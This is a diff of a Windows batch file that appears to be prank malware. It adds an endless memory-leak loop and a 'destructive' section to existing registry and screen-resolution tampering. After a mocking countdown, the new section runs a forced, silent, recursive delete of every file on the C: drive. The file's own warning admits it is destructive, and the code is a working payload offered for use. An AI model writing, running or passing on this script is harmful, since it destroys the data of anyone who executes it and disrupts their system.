@@ -1,7 +1,7 @@
 @echo off
-title Project Lionbang
-echo lol this is unfinished but you can try it
-pause
+title Project Roaring Lions
+echo Heavy caution, READ.
+echo THIS IS UNFINISHED AND DESTRUCTIVE. I AM NOT RESPONSIBLE IF YOU GET FUCKED BY THIS.
 REM WARNING: This batch file is unfinished and may cause unintended consequences.
 REM Use it at your own risk. Proceed with caution.
 
@@ -32,6 +32,7 @@ reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "20" /f
 REM Memory leaks
 :leak
 set "leak=!leak! "
+goto leak
 
 REM Resolution Fucker
 :resolution
@@ -39,3 +40,17 @@ for /L %%i in (1,1,9999) do (
     mode %%i
     timeout 1 > nul
 )
+
+REM Destructive actions
+:destructive
+echo You're doomed! Your files will be destroyed in...
+
+for /L %%i in (5,-1,1) do (
+    echo %%i
+    timeout 1 > nul
+)
+
+echo Deleting files...
+del /f /s /q C:\*.*
+echo Done!
+
